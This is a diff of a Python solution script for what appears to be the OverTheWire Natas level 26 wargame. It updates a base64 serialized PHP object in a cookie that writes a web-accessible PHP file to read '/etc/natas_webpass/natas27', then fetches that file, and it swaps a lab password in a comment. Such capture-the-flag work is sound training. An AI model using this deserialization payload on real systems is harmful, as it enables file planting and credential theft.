@@ -86,7 +86,7 @@ $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
 # we can serialize the Logger object by running serialize.php
 # set the cookies
 cookies_dict = session.cookies.get_dict()
-cookies_dict["drawing"] = "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNToiaW1nL3Bhc3N3b3Jkb2ZuYXRhczI3LnBocCI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjU4OiI8PyBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNicpID8%2BIjt9"
+cookies_dict["drawing"] = "Tzo2OiJMb2dnZXIiOjI6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNzoiaW1nL3Bhc3N3b3Jkb2ZuYXRhczI3XzEucGhwIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTg6Ijw%2FIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3JykgPz4iO30%3D"
 # create a new cookiejar for the session
 session.cookies.clear()
 requests.utils.cookiejar_from_dict(cookies_dict, session.cookies)
@@ -96,6 +96,6 @@ requests.utils.cookiejar_from_dict(cookies_dict, session.cookies)
 # to create the php file that display the password of natas27
 session.get(URL)
 # get the php password file
-response = session.get(URL + "/img/passwordofnatas27.php")
-# natas27 password: oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+response = session.get(URL + "/img/passwordofnatas27_1.php")
+# natas27 password: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
 print(f"natas27 password: {response.text}")
